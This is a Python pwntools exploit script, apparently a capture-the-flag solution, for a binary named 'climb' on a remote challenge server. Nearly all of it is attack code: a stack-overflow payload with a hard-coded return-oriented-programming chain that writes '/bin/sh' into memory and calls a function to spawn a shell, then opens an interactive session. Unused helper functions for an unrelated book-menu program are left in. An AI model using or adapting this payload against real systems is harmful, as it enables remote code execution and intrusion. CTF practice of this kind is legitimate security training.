#!/usr/bin/python3

from pwn import *

target = './climb'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def insert_book(s1,name,s2,summary):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(s1)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('size:')
    p.sendline(s2)
    p.recvuntil('summary:')
    p.sendline(summary)

def delete_book(bookid):
    p.recvuntil('>>')
    p.sendline('2')
    p.sendline(bookid)

def write_sum(bookid,s1,summary):
    p.recvuntil('>>')
    p.sendline('3')
    p.sendline(bookid)
    p.sendline(s1)
    p.sendline(summary)

def call_fun(bookid):
    p.recvuntil('>>')
    p.sendline('4')
    p.sendline(bookid)

#==========================================================
#           CODE
#==========================================================

#p = process(target)#, env={"LD_PRELOAD":"libc.so.6"})

p = remote('cha.hackpack.club',41702)

catflg = b'/bin/sh\0'
catflg = int.from_bytes(catflg, byteorder='little')


#gdb.attach(p)
#                                       pop rax      binsh          pop rdx             bss         wr2bss            pop rdi         bss            call_me
pl = p64(0xdeaddeaddeaddead) * 5 + p64(0x40064b) + p64(catflg) + p64(0x400654) + p64(0x601fb0) + p64(0x40065d) + p64(0x400743) + p64(0x601fb0) + p64(0x400530)


#                                         pop rdi     int 0       pop rsi/r15       bss                    pop rdx              int 8          call read         pop rdi
#pl_main = p64(0x4141414141414141)*5 + p64(0x400743) + p64(0) + p64(0x400741) + p64(0x601fb0) + p64(0) + p64(0x400654) + p64(len(catflg)) + p64(0x400550) + p64(0x400743)
#               bss             call_me         main
#pl_main += p64(0x601fb0) + p64(0x400530) + p64(0x40067f) 

print(p.recvuntil('respond?'))
p.send(pl)

p.interactive()
